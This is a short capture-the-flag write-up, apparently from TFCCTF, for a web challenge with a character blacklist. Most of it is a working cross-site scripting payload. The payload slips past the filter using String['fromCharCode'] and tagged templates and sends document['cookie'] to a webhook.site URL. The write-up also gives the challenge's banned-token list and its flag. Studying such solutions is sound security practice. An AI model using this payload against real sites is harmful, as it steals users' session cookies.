Similar challenge but now with more restrictions.
```python
banned = ["s", "l", "(", ")", "self", "_", ".", "\"", "\\", "&", "%", "^", "#", "@", "!", "*", "-", "import", "eval", "exec", "os", ";", ",", "|", "JAVASCRIPT", "window", "atob", "btoa", "="]
...[SNIP]...
        tp_data = tp.split("<div class=\"rainbow-text\">")[1].split("</div>")[0]
        if "." in tp_data or "href" in tp_data.lower():
            print(". or href detected!")
            name = "Banned characters detected!"
            return name
```
Can't use `%` for url encoding, `=` and `-` in my webhook URL anymore, so we need to build the string ourselves. I used ``String['fromCharCode']`45``  and `document['cookie']` trick to call functions without parantheses.

We end up with this monstrosity:
```js
${banned[1]}SCript${banned[2]}fetch${banned[3]}`httpS://webhook`+String['fromCharCode']`46`+`Site/f0a6a299`+String['fromCharCode']`45`+`a594`+String['fromCharCode']`45`+`4ed4`+String['fromCharCode']`45`+`b2cd`+String['fromCharCode']`45`+`dec8f4be8578/`+document['cookie']${banned[4]}
${banned[1]}/SCript${banned[2]} 
```

Flag: `TFCCTF{r3v3ng3_15_s0_sw33t!!!!!!!!!!!!}`

Solved by: benkyou